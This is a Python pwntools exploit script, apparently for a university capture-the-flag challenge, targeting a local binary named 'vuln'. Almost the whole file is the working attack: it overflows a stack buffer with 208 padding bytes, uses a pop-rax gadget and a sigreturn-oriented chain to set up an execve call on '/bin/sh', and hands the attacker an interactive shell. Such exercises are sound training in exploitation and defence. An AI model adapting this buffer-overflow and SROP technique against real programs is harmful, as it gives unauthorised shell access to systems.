#!/usr/bin/env python3

import pwn

# this is required on gnome to start gdb
pwn.context.terminal = ['gnome-terminal', '--']

# pwninit
exe = pwn.ELF("./vuln")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

port = 1024
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])

pwn.gdb.attach(conn, gdbscript="""
set detach-on-fork off
set follow-fork-mode child
""")

pwn.pause()

# we have a 200 byte buffer but can read 0x200 = 512 bytes
# simple rop chain by hand using gadgets (not many)
# we can use 

# ropper --all --file ./vuln
"""
    mov rax, 59;
    lea rdi, [rip + sh];
    mov rsi, 0;
    mov rdx, 0;
    syscall;
    ret;
sh:
    .string "/bin/sh"
"""

bin_sh_pointer = next(exe.search(b'/bin/sh\x00'))
print(hex(bin_sh_pointer))

gadget_pop_rax = 0x00000000004010b3#: pop rax; ret;
gadget_syscall = 0x0000000000401010#: syscall;

# first we execute the syscall "SIGRETURN" (15) to setup the 4 register, then we just return to syscall again to get a shell :)
frame = pwn.SigreturnFrame()
frame.rax = 59
frame.rdi = bin_sh_pointer
frame.rsi = 0
frame.rdx = 0
frame.rip = gadget_syscall

# do the sigreturn syscall (15) (https://syscalls.mebeim.net/?table=x86/64/x64/latest)
rop_chain = [
    pwn.p64(gadget_pop_rax),
    pwn.p64(15),
    pwn.p64(gadget_syscall),
    bytes(frame)
]

payload = b'A' * 208 + b''.join(gadget for gadget in rop_chain)

conn.sendline(payload)

conn.interactive()
